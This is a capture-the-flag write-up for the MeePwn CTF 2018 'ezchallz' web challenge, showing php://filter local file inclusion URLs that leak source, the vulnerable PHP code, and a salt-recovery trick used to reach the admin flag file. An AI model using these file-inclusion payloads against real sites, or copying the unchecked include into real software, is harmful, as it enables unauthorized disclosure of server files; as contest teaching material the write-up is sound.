# MeePwn CTF 2018
## ezchallz

> http://206.189.92.209/ezchallz/

We use LFI to get website source code:
* `http://206.189.92.209/ezchallz/index.php?page=php://filter/convert.base64-encode/resource=index`
* `http://206.189.92.209/ezchallz/index.php?page=php://filter/convert.base64-encode/resource=register`


index.php:
```
<html>
<a href="index.php">Homepage</a>
<a href="?page=register">Free register</a></li>

<?php
if(isset($_GET["page"]) && !empty($_GET["page"])) {
    $page = $_GET["page"];
    if(strpos(strtolower($page), 'secret') !== false) {
        die('No no no!');
    }
//    else if(strpos($page, 'php') !== false) {
 //       die("N0 n0 n0!");
//    }
    else {
        include($page . '.php');
    }
}
?>
</html>

```

register.php:
```
<html>
<?php
error_reporting(0);

function gendirandshowflag($username) {
	include('secret.php');
	$dname = "";
	$intro = "";
	$_username = md5($username, $raw_output = TRUE);
	for($i = 0; $i<strlen($salt); $i++) {
		$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));
	};
	$dname = "users/" . bin2hex($dname);
	echo 'You have successfully register as ' . $username . '!\n';
	if ($_username === hex2bin('21232f297a57a5a743894a0e4a801fc3')) {
		$intro = "Here is your flag:" . $flag;
	}
	else {
		$intro = "Here is your flag, but I'm not sure 🤔: \nMeePwnCTF{" . md5(random_bytes(16) . $username) . "}";
	}
	mkdir($dname);
	file_put_contents($dname . '/flag.php', $intro);
	header("Location: ". $dname . "/flag.php");
}

if (isset($_POST['username'])) {
	if ($_POST['username'] === 'admin') {
		die('Username is not allowed!');
	}
	else {
		gendirandshowflag($_POST['username']);
	}
}
?>

        <form action="?page=register" method="POST">
        <input type="text" name="username"><br>
        <input type="submit" value="Register">
        </form>
</html>
```

In file register.php we have some code which takes `$username` which is input from user.
md5 hash of an empty string is well defined to be: `d41d8cd98f00b204e9800998ecf8427e`. 
In server response we get `$dname` as a part of URL.
By passing empty `$username` and xoring returned `$dname` with md5 of empty string, we obtain `$salt` which is: `b1ab607479941741db48b1e47d582c1d`.

Now we can xor `$salt` with `md5('admin')` to get `$dname` which corresponds to admin which is: `90884f5d03c3b2e698c1fbea37d833de`.

Now we use LFI to get admins flag.php file:
`http://206.189.92.209/ezchallz/index.php?page=php://filter/convert.base64-encode/resource=users/90884f5d03c3b2e698c1fbea37d833de/flag`

The flag is: `MeePwnCTF{just-a-warmup-challenge-are-you-ready-for-hacking-others-challz?}`
